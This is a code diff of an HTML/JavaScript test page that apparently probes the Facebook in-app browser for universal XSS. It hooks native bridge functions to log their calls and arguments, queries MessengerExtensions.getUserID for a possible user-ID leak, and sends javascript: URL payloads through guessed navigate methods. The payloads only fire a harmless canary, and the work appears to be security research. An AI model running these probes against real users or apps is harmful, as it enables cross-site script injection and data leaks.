@@ -16,7 +16,7 @@
 </style>
 </head>
 <body>
-<h1>FB in-app browser — UXSS all-in-one (benign)</h1>
+<h1>FB in-app browserrrrrr — UXSS all-in-one (benign)</h1>
 <p style="font-size:12px;color:#666">Open inside the FACEBOOK app in-app browser (post/DM the link, tap).
 Auto-recon + hooks + MessengerExtensions check; buttons attempt a benign UXSS canary via discovered
 navigate methods. Canary only flips a flag — reads no data.</p>
@@ -32,7 +32,7 @@ navigate methods. Canary only flips a flag — reads no data.</p>
 <button onclick="tryNav()">2 · call common navigate methods with javascript: canary</button>
 <p>custom unified-bridge call: method / payload(JSON)</p>
 <input id="m" placeholder="method (e.g. openURL)">
-<input id="pl" placeholder='payload JSON (e.g. {"url":"javascript:__UXSS(\'x\')"})'>
+<input id="pl" placeholder="payload JSON, optional (e.g. url + javascript: canary)">
 <button onclick="tryCustom()">3 · call __call_iabjs_unified_bridge(method,nonce,payload)</button>
 
 <button onclick="interact()">simulate interaction (reveal FB method names)</button>
@@ -47,8 +47,7 @@ function keys(o){try{return Object.getOwnPropertyNames(o).join(', ');}catch(e){r
 function nonce(){try{return window.__iabjs_unified_bridge_nonce||'unused';}catch(e){return 'unused';}}
 
 // UXSS canary — any executed javascript: payload calls this
-window.__UXSS=function(w){try{g('ud').textContent=document.domain+' ('+(w||'')+')';g('uxss').style.display='block';document.title='UXSS';log('*** UXSS CANARY FIRED from '+(w||'?')+' domain='+docum
-ent.domain+' ***');}catch(e){}};
+window.__UXSS=function(w){try{g('ud').textContent=document.domain+' ('+(w||'')+')';g('uxss').style.display='block';document.title='UXSS';log('*** UXSS CANARY FIRED from '+(w||'?')+' domain='+document.domain+' ***');}catch(e){}};
 
 // env
 try{ g('env').textContent=
@@ -63,10 +62,8 @@ try{ g('env').textContent=
 // bridges / globals / MessengerExtensions
 try{
  var out=[];
- var markers=['MessengerExtensions','_FB','FB','FBRPC','_FBNativeBridge','iabjs_unified_bridge','__call_iabjs_unified_bridge','_AutofillCallbackHandler','_pcmBridgeCallbackHandler','__iabjs','_MET
-A','browserDeclutter'];
- markers.forEach(function(n){try{ if(typeof window[n]!=='undefined'){ out.push(n+' = '+typeof window[n]+(typeof window[n]==='object'&&window[n]?' { '+keys(window[n]).slice(0,160)+' }':(typeof wind
-ow[n]==='function'?' ['+String(window[n]).slice(0,100).replace(/\s+/g,' ')+'…]':''))); } }catch(e){}});
+ var markers=['MessengerExtensions','_FB','FB','FBRPC','_FBNativeBridge','iabjs_unified_bridge','__call_iabjs_unified_bridge','_AutofillCallbackHandler','_pcmBridgeCallbackHandler','__iabjs','_META','browserDeclutter'];
+ markers.forEach(function(n){try{ if(typeof window[n]!=='undefined'){ out.push(n+' = '+typeof window[n]+(typeof window[n]==='object'&&window[n]?' { '+keys(window[n]).slice(0,160)+' }':(typeof window[n]==='function'?' ['+String(window[n]).slice(0,100).replace(/\s+/g,' ')+'…]':''))); } }catch(e){}});
  // enumerate non-standard window globals briefly
  var extra=[]; for(var k in window){try{ if(/bridge|iab|fb|messenger|native|autofill|rpc/i.test(k) && markers.indexOf(k)<0){ extra.push(k+':'+typeof window[k]); } }catch(e){}}
  if(extra.length) out.push('other: '+extra.join(', '));
@@ -77,18 +74,15 @@ ow[n]==='function'?' ['+String(window[n]).slice(0,100).replace(/\s+/g,' ')+'…]
 try{ if(typeof window.__call_iabjs_unified_bridge==='function'){ var o=window.__call_iabjs_unified_bridge;
  window.__call_iabjs_unified_bridge=function(method,n,p){ log('BRIDGE CALL method='+method+' payload='+safe(p)); try{return o.apply(this,arguments);}catch(e){log('orig err '+e);} };
  log('hooked __call_iabjs_unified_bridge'); } }catch(e){log('hook err '+e);}
-['_AutofillCallbackHandler','_pcmBridgeCallbackHandler'].forEach(function(nm){try{if(typeof window[nm]==='function'){var o=window[nm];window[nm]=function(){log('CB '+nm+' <= '+safe([].slice.call(a
-rguments)));try{return o.apply(this,arguments);}catch(e){}};}}catch(e){}});
+['_AutofillCallbackHandler','_pcmBridgeCallbackHandler'].forEach(function(nm){try{if(typeof window[nm]==='function'){var o=window[nm];window[nm]=function(){log('CB '+nm+' <= '+safe([].slice.call(arguments)));try{return o.apply(this,arguments);}catch(e){}};}}catch(e){}});
 
 // 1 — MessengerExtensions
 function tryME(){
  try{
   if(typeof window.MessengerExtensions==='undefined'){ log('MessengerExtensions absent'); return; }
   log('MessengerExtensions keys: '+keys(window.MessengerExtensions));
-  ['getContextType','getSupportedFeatures'].forEach(function(fn){ try{ if(typeof window.MessengerExtensions[fn]==='function'){ window.MessengerExtensions[fn](function(r){log('ME.'+fn+' ok: '+safe(
-r));},function(e){log('ME.'+fn+' err: '+safe(e));}); } }catch(e){log('ME.'+fn+' threw '+e);} });
-  try{ window.MessengerExtensions.getUserID(function(r){log('ME.getUserID OK: '+safe(r)+' (if this returns a UID to an arbitrary page = leak)');},function(e){log('ME.getUserID err: '+safe(e));});
-}catch(e){log('getUserID threw '+e);}
+  ['getContextType','getSupportedFeatures'].forEach(function(fn){ try{ if(typeof window.MessengerExtensions[fn]==='function'){ window.MessengerExtensions[fn](function(r){log('ME.'+fn+' ok: '+safe(r));},function(e){log('ME.'+fn+' err: '+safe(e));}); } }catch(e){log('ME.'+fn+' threw '+e);} });
+  try{ window.MessengerExtensions.getUserID(function(r){log('ME.getUserID OK: '+safe(r)+' (if this returns a UID to an arbitrary page = leak)');},function(e){log('ME.getUserID err: '+safe(e));}); }catch(e){log('getUserID threw '+e);}
  }catch(e){log('tryME err '+e);}
 }
 
@@ -97,8 +91,7 @@ function tryNav(){
  if(typeof window.__call_iabjs_unified_bridge!=='function'){ log('no unified bridge fn'); return; }
  var methods=['openURL','openUrl','open','loadURL','loadUrl','navigate','navigateTo','openExternalURL','openInApp','openLink','setLocation','redirect'];
  var payloads=[{url:'javascript:window.__UXSS&&__UXSS("nav")'}, 'javascript:window.__UXSS&&__UXSS("nav-str")', {uri:'javascript:__UXSS("uri")'}, {href:'javascript:__UXSS("href")'}];
- methods.forEach(function(mth){ payloads.forEach(function(p){ try{ window.__call_iabjs_unified_bridge(mth, nonce(), p); log('tried '+mth+' <- '+safe(p)); }catch(e){ log('tried '+mth+' threw '+e);
-} }); });
+ methods.forEach(function(mth){ payloads.forEach(function(p){ try{ window.__call_iabjs_unified_bridge(mth, nonce(), p); log('tried '+mth+' <- '+safe(p)); }catch(e){ log('tried '+mth+' threw '+e); } }); });
  log('— if UXSS CANARY fired above, that method navigated to javascript: in-context = UXSS —');
 }
 
